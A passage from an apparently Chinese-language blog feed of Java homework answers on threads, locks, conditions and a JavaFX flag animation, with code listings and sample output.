 <span class="token punctuation">}</span>

 <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> count<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>

 <span class="token annotation punctuation">@Override</span>
 <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">WordOccurrence</span> other<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span>count<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span>

 <span class="token annotation punctuation">@Override</span>
 <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> word <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> count<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-output" data-language="output"><code class="language-output">a 1
assume 1
before 1
directive 2
each 1
enables 1
example 1
examples 1
having 1
identifier 1
identifiers 1
in 1
is 1
library 1
namespace 1
of 1
oneapi 1
out 1
prefix 1
present 1
rest 1
such 1
tbb 1
that 1
the 6
to 2
use 1
using 2
without 1
write 1
you 1
[the 6, directive 2, to 2, using 2, a 1, assume 1, before 1, each 1, enables 1, example 1, examples 1, having 1, identifier 1, identifiers 1, in 1, is 1, library 1, namespace 1, of 1, oneapi 1, out 1, prefix 1, present 1, rest 1, such 1, tbb 1, that 1, use 1, without 1, write 1, you 1]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="升旗使用线程模拟升旗动画来改写程序清单-15-13-通过将两个序中的延迟时间都设置为10比较此程序和程序清单15-13中的程序哪个运行动画快一些"><a class="markdownIt-Anchor" href="#升旗使用线程模拟升旗动画来改写程序清单-15-13-通过将两个序中的延迟时间都设置为10比较此程序和程序清单15-13中的程序哪个运行动画快一些"></a> (升旗)使用线程模拟升旗动画来改写程序清单 15-13。通过将两个序中的延迟时间都设置为10，比较此程序和程序清单15-13中的程序，哪个运行动画快一些?</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Application</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>application<span class="token punctuation">.</span></span><span class="token class-name">Platform</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span></span><span class="token class-name">Scene</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>image<span class="token punctuation">.</span></span><span class="token class-name">ImageView</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>scene<span class="token punctuation">.</span>layout<span class="token punctuation">.</span></span><span class="token class-name">Pane</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javafx<span class="token punctuation">.</span>stage<span class="token punctuation">.</span></span><span class="token class-name">Stage</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RisingFlag</span> <span class="token keyword">extends</span> <span class="token class-name">Application</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token class-name">Stage</span> primaryStage<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">Pane</span> pane <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pane</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ImageView</span> imageView <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageView</span><span class="token punctuation">(</span><span class="token string">"E:\\Repos\\Course\\Java\\my\\code\\W3\\demo\\src\\images\\china.gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pane<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>imageView<span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setLayoutX</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        imageView<span class="token punctuation">.</span><span class="token function">setLayoutY</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

                    <span class="token class-name">Platform</span><span class="token punctuation">.</span><span class="token function">runLater</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>imageView<span class="token punctuation">.</span><span class="token function">getLayoutY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 imageView<span class="token punctuation">.</span><span class="token function">setLayoutY</span><span class="token punctuation">(</span>imageView<span class="token punctuation">.</span><span class="token function">getLayoutY</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
 imageView<span class="token punctuation">.</span><span class="token function">setLayoutY</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>

                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Scene</span> scene <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scene</span><span class="token punctuation">(</span>pane<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setTitle</span><span class="token punctuation">(</span><span class="token string">"RisingFlag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">setScene</span><span class="token punctuation">(</span>scene<span class="token punctuation">)</span><span class="token punctuation">;</span>
        primaryStage<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>应该是这个版本快一点，线程独立不会被阻塞。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-11</title>
    <url>/2023/11/30/09-01-34/</url>
    <content><![CDATA[<p>线程相关</p>
<span id="more"></span>
<h2 id="使用线程池的好处是什么"><a class="markdownIt-Anchor" href="#使用线程池的好处是什么"></a> 使用线程池的好处是什么？</h2>
<ul>
<li>资源管理：线程池有效管理线程的创建和销毁。创建线程是一个昂贵的操作，线程池通过重用已存在的线程减少了这个开销。</li>
<li>性能提升：因为减少了每次任务执行时线程创建和销毁的开销，线程池能显著提升系统性能。</li>
<li>稳定性和可靠性：线程池可以限制系统中线程的最大数量，避免了过多线程导致的内存消耗过大和切换开销，从而增加了系统的稳定性。</li>
<li>更好的任务管理：线程池提供了一种管理任务队列的方式。可以根据需求控制任务的执行顺序（比如先进先出、优先级）。</li>
<li>提供更多的控制：线程池允许用户自定义线程池的大小、线程的创建方式、线程的优先级等，提供了更灵活的线程管理方式。</li>
<li>负载均衡：线程池可以根据系统的负载情况动态调整线程的数量，从而实现负载均衡。</li>
<li>减少资源竞争：由于线程数量得到控制和管理，线程间的资源竞争也会减少，这有助于系统资源的有效利用。</li>
</ul>
<h2 id="如何创建一个锁对象如何得到一个锁和释放一个锁"><a class="markdownIt-Anchor" href="#如何创建一个锁对象如何得到一个锁和释放一个锁"></a> 如何创建一个锁对象，如何得到一个锁和释放一个锁？</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span>

<span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token comment">// 访问或修改共享资源</span>
<span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
    lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>确保释放锁：始终在finally块中释放锁，确保无论代码执行过程中发生什么，锁都会被释放。</li>
<li>避免死锁：确保在持有一个锁的同时不要去获取另一个锁，这可能会导致死锁。</li>
<li>锁的选择：ReentrantLock是一个可重入锁，它允许线程多次获取同一个锁。根据具体需求选择合适的锁类型。</li>
</ul>
<h2 id="如何创建锁的条件方法await-signal-signalall的用途分别是什么"><a class="markdownIt-Anchor" href="#如何创建锁的条件方法await-signal-signalall的用途分别是什么"></a> 如何创建锁的条件？方法await()、signal()、signalAll()的用途分别是什么？</h2>
<table>
<thead>
<tr>
<th>方法</th>
<th>接口</th>
<th>用途</th>
</tr>
</thead>
<tbody>
<tr>
<td>lock()</td>
<td>Lock</td>
<td>获取锁。如果锁不可用，则当前线程将被禁用以用于线程调度目的并处于休眠状态，直到获得锁。</td>
</tr>
<tr>
<td>unlock()</td>
<td>Lock</td>
<td>释放锁。</td>
</tr>
<tr>
<td>newCondition()</td>
<td>Lock</td>
<td>返回绑定到此Lock实例的新Condition实例。</td>
</tr>
<tr>
<td>await()</td>
<td>Condition</td>
<td>使当前线程等待，直到被signal()或signalAll()唤醒，或者被中断。</td>
</tr>
<tr>
<td>signal()</td>
<td>Condition</td>
<td>唤醒一个等待在Condition上的线程。</td>
</tr>
<tr>
<td>signalAll()</td>
<td>Condition</td>
<td>唤醒所有等待在Condition上的线程。</td>
</tr>
</tbody>
</table>
<h2 id="如果将30-6中56行的while改为if会发生什么"><a class="markdownIt-Anchor" href="#如果将30-6中56行的while改为if会发生什么"></a> 如果将30-6中56行的while改为if，会发生什么？</h2>
<p>题目：while(balance &lt; amount)替换为 if(balance &lt; amount)<br>
可能取出多于存款数目的钱</p>
<h2 id="下面代码有什么错误"><a class="markdownIt-Anchor" href="#下面代码有什么错误"></a> 下面代码有什么错误</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">synchronized</span><span class="token punctuation">(</span>object1<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>condition<span class="token punctuation">)</span> object2<span class="token punctuation">.</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> ex<span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>使用错误的对象调用wait()：在Java中，调用wait()方法应该在持有该对象的监视器锁时进行。代码中在object1的监视器锁内调用的object2.wait()。这意味着应该在object2的同步块中调用wait()方法，除非object1和object2是同一个对象。</li>
<li>未处理中断异常：当线程被中断时，InterruptedException会被抛出。通常，这个异常应该被适当处理，而不是被空捕获。一个常见的做法是在捕获块中至少恢复中断状态：</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 恢复中断状态</span>
    <span class="token comment">// 可以选择在这里处理中断</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ol start="3">
<li>潜在的死锁：如果object1和object2是不同的对象，那么这种在不同对象上同步的方式可能会导致死锁，特别是如果其他线程也在尝试以相反的顺序锁定这些对象。</li>
</ol>
<h2 id="改写程序清单30-1在文本域中显示出输出结果"><a class="markdownIt-Anchor" href="#改写程序清单30-1在文本域中显示出输出结果"></a> 改写程序清单30-1，在文本域中显示出输出结果</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Executors</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ExecutorService</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Lock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">ReentrantLock</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>locks<span class="token punctuation">.</span></span><span class="token class-name">Condition</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainClass</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Print</span> print <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintChar</span><span class="token punctuation">(</span><span class="token char">'a'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintChar</span><span class="token punctuation">(</span><span class="token char">'b'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintNum</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Print</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Lock</span> lock <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReentrantLock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Condition</span> printCondition <span class="token operator">=</span> lock<span class="token punctuation">.</span><span class="token function">newCondition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token class-name">Integer</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNum</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>num <span class="token operator">+</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                printCondition<span class="token punctuation">.</span><span class="token function">signalAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token comment">// 异常处理逻辑</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printChar</span><span class="token punctuation">(</span><span class="token class-name">Character</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            lock<span class="token punctuation">.</span><span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span>num <span class="token operator">&gt;=</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> num <span class="token operator">&lt;</span> <span class="token number">99</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    printCondition<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
                lock<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">PrintChar</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">char</span> charToPrint<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> times<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">PrintChar</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">,</span> <span class="token keyword">int</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            charToPrint <span class="token operator">=</span> c<span class="token punctuation">;</span>
            times <span class="token operator">=</span> t<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                print<span class="token punctuation">.</span><span class="token function">printChar</span><span class="token punctuation">(</span>charToPrint<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">PrintNum</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> lastNum<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">PrintNum</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            lastNum <span class="token operator">=</span> n<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> lastNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                print<span class="token punctuation">.</span><span class="token function">setNum</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                print<span class="token punctuation">.</span><span class="token function">printNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 输出</span>
aaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb1 <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">7</span> <span class="token number">8</span> <span class="token number">9</span> <span class="token number">10</span> <span class="token number">11</span> <span class="token number">12</span> <span class="token number">13</span> <span class="token number">14</span> <span class="token number">15</span> <span class="token number">16</span> <span class="token number">17</span> <span class="token number">18</span> <span class="token number">19</span> <span class="token number">20</span> <span class="token number">21</span> <span class="token number">22</span> <span class="token number">23</span> <span class="token number">24</span> <span class="token number">25</span> <span class="token number">26</span> <span class="token number">27</span> <span class="token number">28</span> <span class="token number">29</span> <span class="token number">30</span> <span class="token number">31</span> <span class="token number">32</span> <span class="token number">33</span> <span class="token number">34</span> <span class="token number">35</span> <span class="token number">36</span> <span class="token number">37</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">40</span> <span class="token number">41</span> <span class="token number">42</span> <span class="token number">43</span> <span class="token number">44</span> <span class="token number">45</span> <span class="token number">46</span> <span class="token number">47</span> <span class="token number">48</span> <span class="token number">49</span> <span class="token number">50</span> <span class="token number">51</span> <span class="token number">52</span> <span class="token number">53</span> <span class="token number">54</span> <span class="token number">55</span> <span class="token number">56</span> <span class="token number">57</span> <span class="token number">58</span> <span class="token number">59</span> <span class="token number">60</span> <span class="token number">61</span> <span class="token number">62</span> <span class="token number">63</span> <span class="token number">64</span> <span class="token number">65</span> <span class="token number">66</span> <span class="token number">67</span> <span class="token number">68</span> <span class="token number">69</span> <span class="token number">70</span> <span class="token number">71</span> <span class="token number">72</span> <span class="token number">73</span> <span class="token number">74</span> <span class="token number">75</span> <span 